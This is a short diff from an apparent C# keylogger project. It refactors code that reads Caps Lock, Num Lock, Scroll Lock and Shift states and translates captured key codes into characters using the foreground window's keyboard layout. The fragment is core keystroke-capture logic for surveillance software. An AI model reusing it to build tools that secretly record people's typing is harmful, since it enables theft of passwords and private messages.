@@ -89,9 +89,9 @@ namespace KeyLogger.Services
 
 		private static void SetKeysState()
 		{
-			_capsLock = ((ushort)GetKeyState((int)Keys.CapsLock)) != 0;
-			_numLock = ((ushort)GetKeyState((int)Keys.NumLock)) != 0;
-			_scrollLock = ((ushort)GetKeyState((int)Keys.Scroll)) != 0;
+			_capsLock = GetKeyState((int)Keys.CapsLock) != 0;
+			_numLock = GetKeyState((int)Keys.NumLock) != 0;
+			_scrollLock = GetKeyState((int)Keys.Scroll) != 0;
 			_shift = GetKeyState((int)Keys.ShiftKey) != 0;
 		}
 
@@ -99,11 +99,11 @@ namespace KeyLogger.Services
 		{
 			var buff = new StringBuilder(maxChars);
 			var keyboardState = new byte[maxChars];
-			ushort keyboard = GetKeyboardLayout(
+			var keyboard = GetKeyboardLayout(
 					  GetWindowThreadProcessId(GetForegroundWindow(), IntPtr.Zero));
 			ToUnicodeEx(vkCode, 0, keyboardState, buff, maxChars, 0, (IntPtr)keyboard);
 			var buffSymbol = buff.ToString();
-			string symbol = buffSymbol.Equals("\r") 
+			var symbol = buffSymbol.Equals("\r") 
 				? Environment.NewLine 
 				: buffSymbol;
 			if (_capsLock ^ _shift)
